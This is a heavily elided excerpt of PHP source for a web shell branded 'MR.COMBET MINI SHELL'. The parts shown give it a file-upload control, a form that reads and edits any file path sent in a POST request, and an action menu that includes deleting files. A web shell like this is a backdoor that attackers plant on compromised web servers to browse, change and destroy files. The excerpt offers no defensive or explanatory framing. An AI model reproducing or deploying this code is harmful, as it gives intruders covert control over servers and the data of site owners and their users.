...
<a href="?"><h1 style="font-family: Chilanka; font-size: 37px; color: yellow;">MR.COMBET MINI SHELL</h1></a>
<BODY>
...
<input type="submit" value="UPLOAD" style="margin-top:4px;width:100px;height:27px;font-family:Chilanka;font-size:15px;background:black;color: #00bfff;border:2px solid #00bfff;border-radius:5px"/>';
...
echo '<form method="POST">
<textarea cols=80 rows=20 name="src" style="font-size: 15px; border: 1px solid yellow; background-color: black; color: yellow; width: 100%;height: 1000px;">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
...
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Chilanka;font-size:15px;background:black;color:#00bfff;border:2px solid #00bfff;border-radius:5px\">
...
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Chilanka;font-size:15px;background:black;color:#00bfff;border:2px solid #00bfff;border-radius:5px\"/>
</form></center></td>
</tr>";
}
...
echo "</center></td>
<td class=td_home><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Chilanka;font-size:15px;background:black;color:#00bfff;border:2px solid white;border-radius:5px\">
<option value=\"Action\">Action</option>
<option value=\"delete\">Delete</option>
